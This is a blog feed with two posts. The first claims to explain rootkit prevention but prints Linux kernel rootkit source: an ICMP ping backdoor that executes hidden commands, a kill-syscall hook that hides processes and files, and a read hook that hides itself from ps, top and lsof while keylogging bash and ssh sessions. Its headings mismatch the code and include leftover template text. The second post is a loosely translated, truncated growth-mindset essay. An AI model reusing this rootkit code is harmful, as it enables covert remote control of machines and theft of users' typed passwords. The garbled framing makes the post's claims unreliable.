<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>opprash</title>
  
  <subtitle>all the FAITHS would get RETRUBITIONS</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-09-23T10:52:34.421Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Lu Ruan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>The study of how to solve rookitd record!</title>
    <link href="http://yoursite.com/2017/09/23/new7/"/>
    <id>http://yoursite.com/2017/09/23/new7/</id>
    <published>2017-09-23T10:52:34.421Z</published>
    <updated>2017-09-23T10:52:34.421Z</updated>
    
    <content type="html"><![CDATA[<p>First define an array of 64 elements that need to hide the process prefix [MAX_PREFIX]<br>Then define a filldir hook () function (ps: first, vfs_readir callback function (exact should be called filldir_t filler);<br>Second, sys_getdents is passed to the callback function of vfs_readdir.<br>filldir_t filler is in the various vfs_readir internal callback, by the various fs internal read_dir implementation to complete the directory traversal operation,<br>For each file or subdirectory traversed, callback filler to fill buf) hook the process callback function fill value, when the fill value is equal to the hidden<br>The process number of the stored process (ps: the process character name is converted to a corresponding integer by the kstrtouint () function).<br>prefix [MAX_PREFIX].<br>Finally, in the need to hide the main function of the process in order to scan prefix [MAX_PREFIX], when the scan is not 0 when the value of the process is that we<br>Need to hide the process, return directly, do not return to the buffer. If it is 0, then we do not need to hide the process is not necessary to hide<br>Possession of the process, to the real <code>filldir</code> fill in the buffer.</p><p>Ps: Since the process is always created by the parent process, and the child process can create a child process, so the process is a tree, and rootkid through the hook function<br>Make the rootkid want to hide the process by the system call readir function callback function does not return to the process buffer, in fact, is a broken tree<br>Bad, making the real system process tree becomes incomplete</p><p>because someone will use this way to attack the others ,I only give the Prevention method to who is interested in this!!!</p><h2 id="The-first-situation"><a href="#The-first-situation" class="headerlink" title="The first situation"></a>The first situation</h2><h3 id="How-to-find-hidden-process"><a href="#How-to-find-hidden-process" class="headerlink" title="How to find hidden process"></a>How to find hidden process</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div></pre></td><td class="code"><pre><div class="line">/* execute cmds hidden <span class="keyword">in</span> icmp <span class="built_in">echo</span> packet */</div><div class="line">unsigned int icmp_hook(</div><div class="line"><span class="comment">#if LINUX_VERSION_CODE &lt; KERNEL_VERSION(3,13,0)</span></div><div class="line">        unsigned int hooknum,</div><div class="line"><span class="comment">#else</span></div><div class="line">        const struct nf_hook_ops *ops,</div><div class="line"><span class="comment">#endif</span></div><div class="line">        struct sk_buff *skb,</div><div class="line">        const struct net_device *<span class="keyword">in</span>,</div><div class="line">        const struct net_device *out,</div><div class="line">        int (*okfn)(struct sk_buff *))</div><div class="line">&#123;</div><div class="line">    struct icmphdr *icmph;</div><div class="line">    struct iphdr   *iph;</div><div class="line">    char *data, *cmd;</div><div class="line">    int cmdlen, passlen;</div><div class="line"></div><div class="line">    icmph = icmp_hdr(skb);</div><div class="line">    data = (char *)icmph + 8;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (icmph &amp;&amp; icmph-&gt;<span class="built_in">type</span> == ICMP_ECHO &amp;&amp;</div><div class="line">            !strncmp(rce_pass, data, passlen=strlen(rce_pass))) &#123;</div><div class="line"></div><div class="line">        /* get ip header */</div><div class="line">        iph = ip_hdr(skb);</div><div class="line"></div><div class="line">        /* calculate cmd length */</div><div class="line">        cmdlen = __be16_to_cpu(iph-&gt;tot_len) - iph-&gt;ihl * 4</div><div class="line">            - /*icmp header*/ 8 - passlen - /*space after password*/ 1;</div><div class="line">        FDEBUG(<span class="string">"total len: %d\theader len: %d\tpasslen: %d\n"</span>,</div><div class="line">                __be16_to_cpu(iph-&gt;tot_len), iph-&gt;ihl, passlen);</div><div class="line"></div><div class="line">        /* get cmd string */</div><div class="line">        cmd = rce_cmd;</div><div class="line">        memcpy(cmd, data+passlen+1, cmdlen);</div><div class="line">        cmd[cmdlen] = <span class="string">'\0'</span>;</div><div class="line">        argv[2] = cmd;</div><div class="line"></div><div class="line">        FDEBUG(<span class="string">"Cmd (%d bytes): %s\n"</span>, cmdlen, cmd);</div><div class="line">        </div><div class="line">        /* start userspace <span class="built_in">command</span> */</div><div class="line">        call_usermodehelper(argv[0], argv, NULL, UMH_NO_WAIT);</div><div class="line"></div><div class="line">        goto drop;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">return</span> NF_ACCEPT;</div><div class="line"></div><div class="line">drop:</div><div class="line">    <span class="built_in">return</span> NF_DROP;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* netfilter hook struct */</div><div class="line">struct nf_hook_ops nfhook = &#123;</div><div class="line">    .owner      = THIS_MODULE,</div><div class="line">    .hook       = icmp_hook,</div><div class="line">    .pf         = PF_INET,</div><div class="line">    .hooknum    = NF_INET_LOCAL_IN,</div><div class="line">    .priority   = NF_IP_PRI_FIRST,</div><div class="line">&#125;;</div><div class="line"></div><div class="line">int rce_init(void)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">return</span> nf_register_hook(&amp;nfhook);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void rce_exit(void)</div><div class="line">&#123;</div><div class="line">    nf_unregister_hook(&amp;nfhook);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">/***********************</div><div class="line"> * rootkit control</div><div class="line"> ***********************/</div><div class="line"></div><div class="line">/* <span class="built_in">kill</span> hook */</div><div class="line">asmlinkage long sys_kill(pid_t pid, int sig)</div><div class="line">&#123;</div><div class="line">    switch (sig) &#123;</div><div class="line">        <span class="keyword">case</span> SIGRTMAX:  /* rootkit control */</div><div class="line">            switch (pid) &#123;</div><div class="line">                <span class="keyword">case</span> 0:</div><div class="line">                    file_hide_start();</div><div class="line">                    <span class="built_in">break</span>;</div><div class="line"></div><div class="line">                <span class="keyword">case</span> 1:</div><div class="line">                    file_hide_stop();</div><div class="line">                    <span class="built_in">break</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">break</span>;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> SIGRTMAX-1:  /* hide process */</div><div class="line">            <span class="keyword">if</span> (pid == 0)</div><div class="line">                reveal_all_pids();</div><div class="line">            <span class="keyword">else</span></div><div class="line">                hide_pid(pid);</div><div class="line">            <span class="built_in">break</span>;</div><div class="line"></div><div class="line">        default:</div><div class="line">            <span class="built_in">return</span> ((asmlinkage long (*)(pid_t, int))old_kill)(pid, sig);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Welcome to communicate: <a href="https://762131828@qq.com" target="_blank" rel="external">Server</a></p><h2 id="The-second-situation"><a href="#The-second-situation" class="headerlink" title="The second situation"></a>The second situation</h2><h3 id="Change-the-system’ps-and-pstree"><a href="#Change-the-system’ps-and-pstree" class="headerlink" title="Change the system’ps and pstree!"></a>Change the system’ps and pstree!</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div></pre></td><td class="code"><pre><div class="line">inkage int h4x_read(unsigned int fd, char __user *buf, size_t count)</div><div class="line">&#123;</div><div class="line">  int i,r;</div><div class="line">  char date_time[24];</div><div class="line">  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);</div><div class="line"></div><div class="line">  /*If output is redirected to file or grep, hide it*/</div><div class="line">  copy_from_user(kbuf,buf,255);</div><div class="line">  <span class="keyword">if</span> ((strstr(current-&gt;comm,<span class="string">"ps"</span>))||(strstr(current-&gt;comm,<span class="string">"pstree"</span>))||</div><div class="line">      (strstr(current-&gt;comm,<span class="string">"top"</span>))||(strstr(current-&gt;comm,<span class="string">"lsof"</span>)))&#123;</div><div class="line">    <span class="keyword">if</span>(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST))</div><div class="line">    &#123;</div><div class="line">      kfree(kbuf);</div><div class="line">      <span class="built_in">return</span> -ENOENT;</div><div class="line">    &#125;</div><div class="line">  &#125; </div><div class="line"> </div><div class="line">  r=o_read(fd,buf,count);</div><div class="line">  /*Due to stability issue, we <span class="built_in">limit</span> the keylogging process*/</div><div class="line">  <span class="keyword">if</span>((strcmp(current-&gt;comm,<span class="string">"bash"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"ssh"</span>) == 0)||</div><div class="line">     (strcmp(current-&gt;comm,<span class="string">"scp"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"telnet"</span>) == 0)||</div><div class="line">     (strcmp(current-&gt;comm,<span class="string">"rsh"</span>) == 0) || (strcmp(current-&gt;comm,<span class="string">"rlogin"</span>) == 0))&#123;    </div><div class="line">    /*SPECIAL CHAR*/</div><div class="line">    <span class="keyword">if</span> (counter) &#123;</div><div class="line">      <span class="keyword">if</span> (counter == 2) &#123;  // Arrows + Break</div><div class="line">        //left arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x44) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[LEFT]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //right arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x43) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[RIGHT]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //up arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x41) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[UP]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //down arrow</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x42) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[DOWN]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //<span class="built_in">break</span></div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x50) &#123;</div><div class="line">  strcat(ibuffer,<span class="string">"[BREAK]"</span>);</div><div class="line">  counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //numlock</div><div class="line">        <span class="keyword">if</span>(buf[0] == 0x47) &#123;</div><div class="line">  strcat (ibuffer,<span class="string">"[NUMLOCK]"</span>);</div><div class="line">  counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        strncpy (spbuffer,buf,1);</div><div class="line">        counter ++;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      <span class="keyword">if</span> (counter == 3) &#123;   // F1-F5</div><div class="line">        //F1</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x41) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F1]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F2</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x42) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F2]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F3</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x43) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F3]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F4</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x44) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F4]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">        //F5</div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x45) &#123;</div><div class="line">          strcat(ibuffer,<span class="string">"[F5]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (buf[0] == 0x7E) &#123;     // PgUp, PgDown, Ins, ...</div><div class="line">          //Page Up</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x35)</div><div class="line">            strcat(ibuffer,<span class="string">"[PGUP]"</span>);</div><div class="line">          //Page Down</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x36)</div><div class="line">            strcat(ibuffer,<span class="string">"[PGDN]"</span>);</div><div class="line">          //Delete</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x33)</div><div class="line">            strcat(ibuffer,<span class="string">"[DELETE]"</span>);</div><div class="line">          //End</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x34)</div><div class="line">            strcat(ibuffer,<span class="string">"[END]"</span>);</div><div class="line">          //Home</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x31)</div><div class="line">            strcat(ibuffer,<span class="string">"[HOME]"</span>);</div><div class="line">          //Insert</div><div class="line">          <span class="keyword">if</span> (spbuffer[0] == 0x32)</div><div class="line">            strcat(ibuffer,<span class="string">"[INSERT]"</span>);</div><div class="line">          counter = 0;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (spbuffer[0] == 0x31) &#123;  // F6-F8</div><div class="line">          //F6</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x37)</div><div class="line">            strcat(ibuffer,<span class="string">"[F6]"</span>);</div><div class="line">          //F7</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x38)</div><div class="line">            strcat(ibuffer,<span class="string">"[F7]"</span>);</div><div class="line">          //F8</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x39)</div><div class="line">            strcat(ibuffer,<span class="string">"[F8]"</span>);</div><div class="line">          counter++;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">  </div><div class="line">        <span class="keyword">if</span> (spbuffer[0] == 0x32) &#123; // F9-F12</div><div class="line">          //F9</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x30)</div><div class="line">            strcat(ibuffer,<span class="string">"[F9]"</span>);</div><div class="line">          //F10</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x31)</div><div class="line">            strcat(ibuffer,<span class="string">"[F10]"</span>);</div><div class="line">          //F11</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x33)</div><div class="line">            strcat(ibuffer,<span class="string">"[F11]"</span>);</div><div class="line">          //F12</div><div class="line">          <span class="keyword">if</span> (buf[0] == 0x34)</div><div class="line">            strcat(ibuffer,<span class="string">"[F12]"</span>);</div><div class="line">  </div><div class="line">          counter++;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      <span class="keyword">if</span>(counter &gt;= 4) &#123;  //WatchDog</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      counter ++;</div><div class="line">      goto END;</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">    /*SH, SSHD = 0 /TELNETD = 3/LOGIN = 4*/</div><div class="line">    <span class="keyword">if</span>(r==1 &amp;&amp; (fd==0||fd==3||fd==4))&#123;</div><div class="line">      //CTRL+U</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x15)&#123; </div><div class="line">        ibuffer[0]=<span class="string">'\0'</span>;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //TAB</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x09)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[TAB]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //CTRL+C</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x03)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[CTRL+C]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //CTRL+D</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x03)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[CTRL+D]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //CTRL+]</div><div class="line">      <span class="keyword">if</span>(buf[0]==0x1D)&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"[CTRL+]]"</span>);</div><div class="line">        counter = 0;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      //BACKSPACE 0x7F Local / 0x08 Remote</div><div class="line">      <span class="keyword">if</span> (buf[0] == 0x7F || buf[0] == 0x08) &#123;</div><div class="line">        <span class="keyword">if</span> (ibuffer[strlen(ibuffer) - 1] == <span class="string">']'</span>) &#123;</div><div class="line">          <span class="keyword">for</span> (i=2;strlen(ibuffer);i++)&#123;</div><div class="line">            <span class="keyword">if</span> (ibuffer[strlen (ibuffer) - i] == <span class="string">'['</span>) &#123;</div><div class="line">              ibuffer[strlen(ibuffer) - i] = <span class="string">'\0'</span>;</div><div class="line">              <span class="built_in">break</span>;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">          goto END;</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">          ibuffer[strlen(ibuffer) - 1] = <span class="string">'\0'</span>;</div><div class="line">          goto END;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">  </div><div class="line">      <span class="keyword">if</span> (buf[0] == 0x1B) &#123;</div><div class="line">        counter++;</div><div class="line">        goto END;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span>(buf[0] != <span class="string">'\n'</span> &amp;&amp; buf[0] != <span class="string">'\r'</span>)&#123;</div><div class="line">        strncat(ibuffer,buf,sizeof(ibuffer));</div><div class="line">      &#125;<span class="keyword">else</span>&#123;</div><div class="line">        strcat(ibuffer,<span class="string">"\n"</span>);</div><div class="line">        get_time(date_time);</div><div class="line">        snprintf(obuffer,sizeof(obuffer),<span class="string">"[%s] - [UID = %i ] %s &gt; %s"</span>,date_time,current_uid(),current-&gt;comm,ibuffer);</div><div class="line">//I don<span class="string">'t want to log buffer more than 60 chars, most of them are useless data</span></div><div class="line"><span class="string">        if(strlen(ibuffer)&lt;60) &#123;</span></div><div class="line"><span class="string">          log_to_file(obuffer);</span></div><div class="line"><span class="string">        &#125;</span></div><div class="line"><span class="string">        ibuffer[0]='</span>\0<span class="string">';</span></div><div class="line"><span class="string">      &#125;</span></div><div class="line"><span class="string">    &#125;</span></div><div class="line"><span class="string">  &#125;</span></div><div class="line"><span class="string">  END:</span></div><div class="line"><span class="string">  return r;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure><p>Welcome to communicate: <a href="https://762131828@qq.com" target="_blank" rel="external">Server</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;First define an array of 64 elements that need to hide the process prefix [MAX_PREFIX]&lt;br&gt;Then define a filldir hook () function (ps: fir
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2017/09/19/new%206/"/>
    <id>http://yoursite.com/2017/09/19/new 6/</id>
    <published>2017-09-19T00:59:26.197Z</published>
    <updated>2017-09-19T01:06:54.228Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="What-is-the-most-deadly-gap"><a href="#What-is-the-most-deadly-gap" class="headerlink" title="What is the most deadly gap?"></a>What is the most deadly gap?</h2><p>Angela Lee is a math teacher in a public school in the United States, she found a strange phenomenon -</p><p>IQ high student achievement is not necessarily good, on the contrary, many IQ is not so high students but achieved good results.</p><p>In other words, IQ is not the only criterion for determining success and failure.</p><p>Later, Angela Lee returned to the University to pursue a master’s degree in psychology, began to systematically study “what ultimately determines whether a person is successful?”</p><p>They investigated the officers of the West Point, senior teachers, and sold the elite … and found that they had a common feature.</p><p>This feature is not a beautiful appearance, not social ability, not a strong physique, nor is it a high IQ.Is perseverance.</p><h2 id="first-find-the-reason"><a href="#first-find-the-reason" class="headerlink" title="first:find the reason"></a>first:find the reason</h2><h3 id="At-present-the-most-effective-way-to-cultivate-perseverance-is-Stanford-University-Carol-Dweck-proposed-“growth-thinking”"><a href="#At-present-the-most-effective-way-to-cultivate-perseverance-is-Stanford-University-Carol-Dweck-proposed-“growth-thinking”" class="headerlink" title="At present the most effective way to cultivate perseverance is Stanford University Carol Dweck proposed “growth thinking”"></a>At present the most effective way to cultivate perseverance is Stanford University Carol Dweck proposed “growth thinking”</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">At present the most effective way to cultivate perseverance is Stanford University Carol Dweck proposed <span class="string">"growth thinking"</span></div></pre></td></tr></table></figure><p>The core idea of growth thinking is that human learning ability can be changed.</p><p>In contrast, “fixed thinking” is that people’s talent is born.</p><p>In the face of setbacks and failures, these two kinds of thinking will lead directly to the two results -</p><p>Fixed thinking people think that this is their own limit, back to the days of weakness, so choose to give up;</p><p>Growing thinking people think that if you work harder, you can do better.</p><p>The former as a failure as the end of the world, the latter as a challenge to failure and learning opportunities.</p><p>The most deadly gap is the way of thinking.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">### Second:Growth thinking does not believe in fatalism.</div><div class="line"></div><div class="line">``` bash</div><div class="line">Growth thinking does not believe in fatalism.</div><div class="line"></div><div class="line">&quot;You are not going to go to college with this kind of IQ.&quot; &quot;I&apos;ll take a few more times.&quot;</div><div class="line"></div><div class="line">&quot;How can your family be so poor and how can you start?&quot; &quot;Money I can earn.&quot;</div><div class="line"></div><div class="line">&quot;You can not catch the girl.&quot; &quot;The first chase.&quot;</div><div class="line"></div><div class="line">Compared with the results, more concerned about the process;</div><div class="line"></div><div class="line">Compared with the failure, more concerned about the accumulated experience;</div><div class="line"></div><div class="line">This is the growth of thinking, do not believe that &quot;people&apos;s life, day is doomed&quot;, but always keep the development, keep making progress.</div></pre></td></tr></table></figure><h3 id="Third"><a href="#Third" class="headerlink" title="Third"></a>Third</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Son of mathematics <span class="built_in">test</span> 59 points, he stood <span class="keyword">in</span> front of his father, head down, tightly holding the papers.</div><div class="line"></div><div class="line">Dad can say: <span class="string">"how can you even pass the exam can not, this life do not want to learn math!"</span></div><div class="line"></div><div class="line">Dad can also say: <span class="string">"wow, poor will be able to pass, the future immeasurable ah boy!"</span></div><div class="line"></div><div class="line">The first sentence, <span class="keyword">in</span> addition to his father vent their emotions, the child is not a little benefit.</div><div class="line"></div><div class="line">The child will only become increasingly skeptical of himself: I may not really learn the material</div><div class="line"></div><div class="line">The second sentence is to <span class="built_in">let</span> the children understand that he has been very close to the passing, the next time as long as more effort can become better.</div><div class="line"></div><div class="line">Consciously cultivating children<span class="string">'s growth thinking is extremely important, which allows them to more positive face of failure, rather than touch</span></div></pre></td></tr></table></figure><h3 